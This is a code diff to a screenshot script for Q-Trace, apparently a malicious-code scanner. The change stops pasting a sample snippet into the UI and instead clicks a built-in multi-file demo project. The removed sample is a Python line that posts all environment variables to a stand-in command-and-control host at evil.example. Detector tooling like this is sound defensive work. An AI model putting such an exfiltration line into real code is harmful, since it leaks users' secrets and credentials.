@@ -6,9 +6,12 @@ Runs locally or in CI:
     pip install playwright && python -m playwright install chromium
     python tools/capture_ui.py        # from the qtrace-pro/ directory
 
-It boots webapp.py on a free port, loads the page, runs the "credential exfil"
-example so the screenshot shows real findings, and writes assets/qtrace-ui.png
-at the repository root.
+It boots webapp.py on a free port, loads the page, and runs the **realistic
+7-file demo project** (the "▶ Try a realistic demo project" button) so the
+screenshot shows Q-Trace's genuine value — cross-file credential exfiltration,
+a buried logic bomb, an import-correlated AWS key and a typosquatted
+dependency found across a whole project — not a trivial 2-line snippet anyone
+could spot by eye. Writes assets/qtrace-ui.png at the repository root.
 """
 from __future__ import annotations
 
@@ -23,9 +26,6 @@ HERE = os.path.dirname(os.path.abspath(__file__))
 QDIR = os.path.dirname(HERE)                       # qtrace-pro/
 ROOT = os.path.dirname(QDIR)                        # repo root
 OUT = os.path.join(ROOT, "assets", "qtrace-ui.png")
-
-EXAMPLE = ("import os, requests\n"
-           "requests.post('https://evil.example/c2', data=os.environ)")
 
 
 def _free_port() -> int:
@@ -59,10 +59,14 @@ def main() -> int:
             page = browser.new_page(viewport={"width": 1200, "height": 820},
                                     device_scale_factor=2)
             page.goto(f"http://127.0.0.1:{port}/", wait_until="networkidle")
-            page.fill("#code", EXAMPLE)
-            page.click("#run")
-            page.wait_for_selector(".finding", timeout=10000)
-            page.wait_for_timeout(400)  # let cards settle
+            # Showcase the realistic multi-file demo, not a toy snippet.
+            page.click("#demo")
+            page.wait_for_selector(".finding", timeout=15000)
+            # Wait until the cross-file project scan has fully populated
+            # (several findings across multiple files), then let SVG settle.
+            page.wait_for_function(
+                "document.querySelectorAll('.finding').length >= 5", timeout=15000)
+            page.wait_for_timeout(600)
             page.screenshot(path=OUT, full_page=True)
             browser.close()
         print(f"wrote {OUT}")
